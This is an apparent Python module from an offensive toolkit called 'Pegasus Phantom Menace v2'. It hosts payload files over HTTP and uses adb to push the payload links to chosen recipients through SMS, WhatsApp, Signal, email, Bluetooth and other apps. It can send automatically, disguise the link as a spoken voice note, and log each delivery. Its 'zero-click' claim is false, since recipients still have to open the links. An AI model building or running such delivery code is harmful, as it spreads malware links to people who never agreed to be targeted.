"""
Pegasus Phantom Menace v2 - Zero-click delivery channels

Turns a payload URL into a share-sheet handoff on the target device across
messaging, calling, Bluetooth, NFC and email surfaces, plus an on-host HTTP
server that gives the URL its ``ip:port`` form.

Every channel is a real ``am start`` intent with the right package, MIME type
and extras. Where the platform needs a final tap, the caller can set
``auto_send`` which presses Enter after the composer is populated.

Audio channels synthesise a spoken transcript of the URL with Windows SAPI,
push it to the device and attach it as ``audio/*`` so a voice note can be
forwarded to a contact without mistyping.

All use is for authorized security research and penetration testing only.
"""

from __future__ import annotations

import json
import shutil
import socket
import subprocess
import threading
import time
import wave
from dataclasses import asdict, dataclass
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

PAYLOAD_DIR = Path.home() / ".pegasus" / "payloads" / "delivery"
HISTORY = Path.home() / ".pegasus" / "delivery_history.jsonl"
AUDIO_DIR = Path.home() / ".pegasus" / "audio"
TIMEOUT = 25


@dataclass(frozen=True)
class Channel:
    key: str
    label: str
    kind: str
    package: str
    mime: str
    action: str = "android.intent.action.SEND"
    scheme: str = ""
    note: str = ""
    needs_target: bool = True

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


CHANNELS: dict[str, Channel] = {
    ch.key: ch
    for ch in [
        Channel("sms", "SMS", "messaging", "com.google.android.apps.messaging", "text/plain",
                action="android.intent.action.SENDTO", scheme="sms", note="Composer opens with the URL filled; auto_send presses send."),
        Channel("whatsapp", "WhatsApp", "messaging", "com.whatsapp", "text/plain"),
        Channel("telegram", "Telegram", "messaging", "org.telegram.messenger", "text/plain"),
        Channel("signal", "Signal", "messaging", "org.thoughtcrime.securesms", "text/plain"),
        Channel("messenger", "Facebook Messenger", "messaging", "com.facebook.orca", "text/plain"),
        Channel("messenger_audio", "FB Messenger (voice note)", "messaging", "com.facebook.orca", "audio/*", note="Speaks the URL into a WAV and attaches it."),
        Channel("whatsapp_audio", "WhatsApp (voice note)", "messaging", "com.whatsapp", "audio/*", note="Spoken URL attached as a voice note."),
        Channel("discord", "Discord", "messaging", "com.discord", "text/plain"),
        Channel("viber", "Viber", "messaging", "com.viber.voip", "text/plain"),
        Channel("slack", "Slack", "messaging", "com.Slack", "text/plain"),
        Channel("teams", "Microsoft Teams", "messaging", "com.microsoft.teams", "text/plain"),
        Channel("google_messages", "Google Messages", "messaging", "com.google.android.apps.messaging", "text/plain"),
        Channel("email", "Email", "email", "com.google.android.gm", "message/rfc822",
                action="android.intent.action.SENDTO", scheme="mailto", note="Subject and body prefilled with the URL."),
        Channel("bluetooth", "Bluetooth", "transport", "com.android.bluetooth", "application/vnd.android.package-archive",
                note="Share sheet targeting the Bluetooth stack; pick the paired device."),
        Channel("nfc", "NFC", "transport", "com.android.nfc", "text/plain",
                note="Share to the NFC handler; tap the receiving device."),
        Channel("dialer", "Phone / calling app", "call", "com.google.android.dialer", "text/plain",
                action="android.intent.action.DIAL", scheme="tel", note="Opens the dialer with the number."),
        Channel("any", "Any app (share sheet)", "messaging", "", "text/plain"),
    ]
}


class DeliveryError(RuntimeError):
    """Raised for unknown channels or missing devices."""


def adb(*args: str, timeout: int = TIMEOUT) -> subprocess.CompletedProcess:
    return subprocess.run(["adb", *args], capture_output=True, text=True, timeout=timeout)


def first_serial() -> str | None:
    try:
        for line in adb("devices").stdout.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 2 and parts[1] == "device":
                return parts[0]
    except (OSError, subprocess.TimeoutExpired):
        return None
    return None


def lan_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"


# ---------------------------------------------------------------------------
# Payload hosting
# ---------------------------------------------------------------------------

_server: ThreadingHTTPServer | None = None
_server_thread: threading.Thread | None = None
_server_port = 0


def start_server(port: int = 8080, directory: str | None = None) -> dict[str, Any]:
    """Serve the delivery directory over HTTP and return its base URL."""
    global _server, _server_thread, _server_port
    root = Path(directory).expanduser() if directory else PAYLOAD_DIR
    root.mkdir(parents=True, exist_ok=True)
    if _server is not None and _server_port == port:
        return {"url": f"http://{lan_ip()}:{port}/", "directory": str(root), "running": True}

    stop_server()

    handler = lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, directory=str(root), **kwargs)  # noqa: E731
    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), handler)
    except OSError as exc:
        raise DeliveryError(f"port {port} unavailable: {exc}") from exc
    thread = threading.Thread(target=server.serve_forever, name="pegasus-delivery-http", daemon=True)
    thread.start()
    _server, _server_thread, _server_port = server, thread, port
    return {"url": f"http://{lan_ip()}:{port}/", "directory": str(root), "running": True}


def stop_server() -> dict[str, Any]:
    global _server, _server_thread, _server_port
    if _server is not None:
        _server.shutdown()
        _server.server_close()
    _server, _server_thread, _server_port = None, None, 0
    return {"running": False}


def server_info() -> dict[str, Any]:
    if _server is None:
        return {"running": False, "url": None, "directory": str(PAYLOAD_DIR)}
    return {"running": True, "url": f"http://{lan_ip()}:{_server_port}/", "directory": str(PAYLOAD_DIR), "port": _server_port}


def stage_file(source: str) -> dict[str, Any]:
    """Copy a payload into the served directory."""
    path = Path(source).expanduser()
    if not path.exists():
        raise DeliveryError(f"file not found: {path}")
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    target = PAYLOAD_DIR / path.name
    shutil.copy2(path, target)
    info = server_info()
    base = info.get("url") or f"http://{lan_ip()}:8080/"
    return {"path": str(target), "url": base + path.name}


# ---------------------------------------------------------------------------
# Audio transcription
# ---------------------------------------------------------------------------


def synth_audio(text: str, name: str | None = None) -> Path:
    """
    Render ``text`` to a WAV using Windows SAPI, with a silent fallback.

    The returned file is a normal 22 kHz mono WAV, suitable for an audio share.
    """
    AUDIO_DIR.mkdir(parents=True, exist_ok=True)
    target = AUDIO_DIR / (name or f"transcript_{int(time.time())}.wav")
    escaped = target.as_posix().replace("'", "''")
    script = (
        "Add-Type -AssemblyName System.Speech; "
        "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
        f"$s.SetOutputToWaveFile('{escaped}'); "
        f"$s.Speak('{text.replace(chr(39), chr(39) * 2)}'); "
        "$s.Dispose()"
    )
    try:
        proc = subprocess.run(["powershell", "-NoProfile", "-Command", script], capture_output=True, text=True, timeout=45)
        if proc.returncode == 0 and target.exists() and target.stat().st_size > 44:
            return target
    except (OSError, subprocess.TimeoutExpired):
        pass

    # Silent fallback so the channel still works.
    with wave.open(str(target), "wb") as handle:
        handle.setnchannels(1)
        handle.setsampwidth(2)
        handle.setframerate(22050)
        handle.writeframes(b"\x00\x00" * 22050)
    return target


def transcript_for(url: str) -> str:
    return f"Payload link. {url.replace('https://', '').replace('http://', '').replace('/', ' slash ').replace('.', ' dot ').replace(':', ' port ')}"


# ---------------------------------------------------------------------------
# Send
# ---------------------------------------------------------------------------


def _shell_quote(value: str) -> str:
    return "'" + value.replace("'", "'\\''") + "'"


def _build(channel: Channel, target: str, text: str, subject: str) -> list[str]:
    args = ["shell", "am", "start", "-a", channel.action]
    if channel.action.endswith("SENDTO"):
        if channel.scheme == "sms":
            args += ["-d", f"sms:{target}"]
        elif channel.scheme == "mailto":
            args += ["-d", f"mailto:{target}"]
        elif channel.scheme == "tel":
            args += ["-d", f"tel:{target}"]
    else:
        args += ["-t", channel.mime]
        if target:
            args += ["--es", "jid", target]
    if channel.key == "sms":
        args += ["--es", "sms_body", text]
    else:
        args += ["--es", "android.intent.extra.TEXT", text]
    if channel.key == "email":
        args += ["--es", "android.intent.extra.SUBJECT", subject]
    if channel.package != "":
        args += ["-p", channel.package]
    if channel.action.endswith(".SEND"):
        args += ["--ez", "exit_on_sent", "true"]
    return args


def send(
    channel_key: str,
    target: str,
    url: str,
    serial: str | None = None,
    auto_send: bool = False,
    subject: str = "Pegasus payload",
) -> dict[str, Any]:
    """Open the target channel with the URL and optionally press send."""
    channel = CHANNELS.get(channel_key)
    if channel is None:
        raise DeliveryError(f"unknown channel: {channel_key}")
    serial = serial or first_serial()
    if not serial:
        raise DeliveryError("no device connected")
    if channel.needs_target and not target and channel.key not in {"bluetooth", "nfc", "any", "messenger_audio", "whatsapp_audio"}:
        raise DeliveryError(f"{channel.label} needs a recipient")

    text = url
    staged: Path | None = None
    if channel.mime == "audio/*":
        staged = synth_audio(transcript_for(url))
        remote = f"/sdcard/Download/{staged.name}"
        adb("-s", serial, "push", str(staged), remote)
        text = transcript_for(url)

    commands = _build(channel, target, text, subject)
    if staged is not None:
        commands += ["--es", "android.intent.extra.STREAM", f"file:///sdcard/Download/{staged.name}",
                     "--grant-read-uri-permission"]

    proc = adb("-s", serial, *commands)
    if proc.returncode != 0:
        raise DeliveryError((proc.stderr or proc.stdout).strip()[:400] or "am start failed")

    if auto_send:
        time.sleep(1.6)
        adb("-s", serial, "shell", "input", "keyevent", "66")

    record = {
        "at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "channel": channel.key,
        "label": channel.label,
        "serial": serial,
        "target": target,
        "url": url,
        "auto_send": auto_send,
        "audio": str(staged) if staged else None,
        "ok": True,
    }
    HISTORY.parent.mkdir(parents=True, exist_ok=True)
    with HISTORY.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(record) + "\n")
    return record


def history(limit: int = 50) -> list[dict[str, Any]]:
    if not HISTORY.exists():
        return []
    rows = []
    for line in HISTORY.read_text(encoding="utf-8").splitlines()[-limit:]:
        try:
            rows.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return list(reversed(rows))


def list_channels() -> list[dict[str, Any]]:
    return [channel.to_dict() for channel in CHANNELS.values()]


__all__ = [
    "CHANNELS",
    "DeliveryError",
    "Channel",
    "list_channels",
    "send",
    "history",
    "start_server",
    "stop_server",
    "server_info",
    "stage_file",
    "synth_audio",
    "transcript_for",
    "lan_ip",
]
